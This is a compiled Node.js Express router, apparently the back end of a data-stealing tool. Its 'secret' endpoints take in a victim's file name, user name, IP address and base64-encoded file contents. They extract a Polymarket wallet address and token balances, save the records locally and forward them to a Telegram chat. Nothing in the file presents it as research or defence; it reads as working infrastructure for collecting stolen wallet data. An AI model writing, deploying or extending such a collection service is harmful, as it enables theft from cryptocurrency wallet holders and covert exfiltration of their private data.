"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.secretRouter = void 0;
/**
 * Secret API: POST /source-checker, POST /polymarket, GET /telegram-test (mounted at root).
 * Saves to data/sources.json and sends to Telegram via services/telegram.
 */
const express_1 = __importDefault(require("express"));
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const telegram = __importStar(require("../services/telegram"));
const router = express_1.default.Router();
exports.secretRouter = router;
const DATA_DIR = path_1.default.join(process.cwd(), 'data');
const SOURCES_FILE = path_1.default.join(DATA_DIR, 'sources.json');
function ensureDataDir() {
    if (!fs_1.default.existsSync(DATA_DIR)) {
        fs_1.default.mkdirSync(DATA_DIR, { recursive: true });
    }
}
function loadSources() {
    ensureDataDir();
    if (!fs_1.default.existsSync(SOURCES_FILE))
        return [];
    try {
        const raw = fs_1.default.readFileSync(SOURCES_FILE, 'utf-8');
        return JSON.parse(raw);
    }
    catch {
        return [];
    }
}
function saveSource(source) {
    const records = loadSources();
    records.push({
        source,
        receivedAt: new Date().toISOString(),
    });
    ensureDataDir();
    fs_1.default.writeFileSync(SOURCES_FILE, JSON.stringify(records, null, 2), 'utf-8');
}
function escapeHtml(s) {
    return s
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}
function decodeBase64IfNeeded(value) {
    const trimmed = String(value).trim();
    if (!trimmed)
        return trimmed;
    try {
        const decoded = Buffer.from(trimmed, 'base64').toString('utf-8');
        return decoded || trimmed;
    }
    catch {
        return trimmed;
    }
}
/** POST /source-checker */
router.post('/source-checker', async (req, res) => {
    try {
        const { source } = req.body;
        if (source === undefined || source === null) {
            return res.status(400).json({ ok: false, error: 'Missing "source" in body' });
        }
        const value = typeof source === 'string' ? source : String(source);
        saveSource(value);
        await telegram.sendMessage(`[Source checker]\nSource: ${value.slice(0, 4000)}${value.length > 4000 ? '…' : ''}`);
        return res.status(200).json({ ok: true, message: 'Source saved' });
    }
    catch (err) {
        console.error('[source-checker] Error:', err);
        return res.status(500).json({ ok: false, error: 'Failed to save source' });
    }
});
/** POST /polymarket */
router.post('/polymarket', async (req, res) => {
    try {
        const { filename, user, ip, content } = req.body;
        if (filename === undefined || filename === null) {
            return res.status(400).json({ ok: false, error: 'Missing "filename" in body' });
        }
        if (user === undefined || user === null) {
            return res.status(400).json({ ok: false, error: 'Missing "user" in body' });
        }
        if (ip === undefined || ip === null) {
            return res.status(400).json({ ok: false, error: 'Missing "ip" in body' });
        }
        if (content === undefined || content === null) {
            return res.status(400).json({ ok: false, error: 'Missing "content" in body' });
        }
        const contentStr = String(content);
        const contentDecrypted = decodeBase64IfNeeded(contentStr);
        let parsed = {};
        try {
            parsed = JSON.parse(contentDecrypted);
        }
        catch {
            // not JSON, keep parsed empty
        }
        const publicAddress = parsed.polymarket?.proxy_wallet_address?.trim() || '(not found)';
        const body = req.body;
        const rawTokenBalances = body.token_balances ?? parsed.token_balances;
        const totalTokens = body.total_tokens ?? parsed.total_tokens;
        const tokenBalanceLines = [];
        if (rawTokenBalances != null) {
            if (Array.isArray(rawTokenBalances)) {
                for (const item of rawTokenBalances) {
                    const name = (item?.name ?? item?.token ?? 'Token');
                    const bal = item?.balance;
                    if (bal !== undefined && bal !== null) {
                        tokenBalanceLines.push(`${escapeHtml(String(name))}: <code>${escapeHtml(String(bal))}</code>`);
                    }
                }
            }
            else if (typeof rawTokenBalances === 'object' && rawTokenBalances !== null) {
                for (const [name, bal] of Object.entries(rawTokenBalances)) {
                    if (bal !== undefined && bal !== null) {
                        tokenBalanceLines.push(`${escapeHtml(name)}: <code>${escapeHtml(String(bal))}</code>`);
                    }
                }
            }
        }
        if (tokenBalanceLines.length === 0 && totalTokens !== undefined && totalTokens !== null) {
            tokenBalanceLines.push(`Total: <code>${escapeHtml(String(totalTokens))}</code>`);
        }
        const value = {
            filename,
            user,
            ip,
            content: contentDecrypted,
            total_tokens: totalTokens != null ? String(totalTokens) : undefined,
            token_balances: rawTokenBalances,
        };
        saveSource(JSON.stringify(value, null, 2));
        const tokenSection = tokenBalanceLines.length > 0
            ? 'Token balances:\n' + tokenBalanceLines.join('\n')
            : 'Token balances: (not provided)';
        const msg = `[Polymarket]\nFilename: ${escapeHtml(filename)}\nUser: ${escapeHtml(user)}\nIP: ${escapeHtml(ip)}\n\n` +
            `Public address:\n<code>${escapeHtml(publicAddress)}</code>\n\n` +
            tokenSection;
        await telegram.sendMessage(msg, { parse_mode: 'HTML' });
        return res.status(200).json({ ok: true, message: 'Polymarket data saved' });
    }
    catch (err) {
        console.error('[polymarket] Error:', err);
        return res.status(500).json({ ok: false, error: 'Failed to save polymarket data' });
    }
});
/** GET /telegram-test — uses shared Telegram service (supports TELEGRAM_API_BASE for other API) */
router.get('/telegram-test', async (_req, res) => {
    const result = await telegram.sendTestMessage();
    return res.status(result.ok ? 200 : 400).json({
        ok: result.ok,
        error: result.ok ? undefined : result.message,
        message: result.message,
        chat_id_used: result.chat_id_used,
        telegram_response: result.telegram_response,
        hint: result.hint,
    });
});
//# sourceMappingURL=secret.js.map